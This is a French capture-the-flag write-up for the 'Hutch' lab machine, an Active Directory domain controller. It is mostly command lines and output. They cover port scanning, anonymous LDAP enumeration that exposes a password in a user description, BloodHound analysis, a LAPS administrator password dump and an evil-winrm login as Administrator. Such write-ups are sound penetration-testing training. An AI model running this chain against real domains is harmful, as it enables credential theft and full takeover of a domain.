  # Hutch

	sudo masscan -p1-65535,U:1-65535 192.168.240.122 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 192.168.240.122 -oN nmap.txt
	feroxbuster --silent -u http://192.168.240.122
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	53/tcp open domain Simple DNS Plus  
	80/tcp open http Microsoft IIS httpd 10.0  
	88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-09 07:15:40Z)  
	135/tcp open msrpc Microsoft Windows RPC  
	139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
	389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-S  
	ite-Name)  
	445/tcp open microsoft-ds?  
	593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
	636/tcp open tcpwrapped  
	3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-S  
	ite-Name)  
	3269/tcp open tcpwrapped  
	5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
	9389/tcp open mc-nmf .NET Message Framing  
	49666/tcp open msrpc Microsoft Windows RPC  
	49667/tcp open msrpc Microsoft Windows RPC  
	49671/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0  
	49672/tcp open msrpc Microsoft Windows RPC  
	49674/tcp open msrpc Microsoft Windows RPC  
	49687/tcp open msrpc Microsoft Windows RPC  
	49758/tcp open msrpc Microsoft Windows RPC 

Rien d'exploitable sur les ports habituels.

	nmap -n -sV --script "ldap*" 192.168.240.122

Scan complémentaire sur LDAP.

On obtient énormément d'informations mais les plus importantes sont le domaine et le CN : 

	ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.240.122 | grep sAMAccountName
	ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.240.122 | grep description

On récupère un tas de noms d'utilisateurs ainsi qu'un mot de passe dans l'une des descriptions. J'ai utilisé un "grep" astucieux pour éviter de passer par CrackMapExec, mais si ce scénario tombe pendant l'OSCP il faudra utiliser CrackMapExec pour être certain de ne louper aucun compte pour du pivoting éventuel : 

	ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.240.122 | grep CrabSharkJellyfish192 -A 5 -B 5

On voit que c'est Freddy McSorley qui a ce mot de passe. On peut se connecter au SMB mais il n'y a rien d'intéressant.

	smbclient -L //192.168.240.122/ -U HUTCH/fmcsorley

En revanche, j'ai trouvé une version de Bloodhound en Python et exécutable à distance : 

	git clone https://github.com/fox-it/BloodHound.py
	python  ~/Downloads/BloodHound.py/bloodhound.py -d HUTCH.OFFSEC -u fmcsorley -p CrabSharkJellyfish192 -c All -ns 192.168.240.122
	...
	sudo neo4j start
	bloodhound

J'ai lancé une analyse "Find Shortest Paths to Domain Admins" et le graphe a donné un résultat intéressant ; Freddy McSorley a un droit de type "readLAPSPassword" sur la machine. Il y a des outils pour exploiter cela mais on peut aussi le faire de manière native avec ldapsearch. Voir https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/

	ldapsearch -x -b "dc=HUTCH,dc=OFFSEC" -H ldap://192.168.240.122 -D "fmcsorley@HUTCH.OFFSEC" -w CrabSharkJellyfish192 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
	
	
> ...
> </br>\# HUTCHDC, Domain Controllers, hutch.offsec  
> dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec  
> ms-Mcs-AdmPwd: ]UFW]Dc,u4tOtk
> </br>...

Connexion finale : 

	evil-winrm -u Administrator -p ']UFW]Dc,u4tOtk' -i 192.168.240.122
	type C:\Users\fmcsorley\Desktop\local.txt
	type C:\Users\Administrator\Desktop\proof.txt



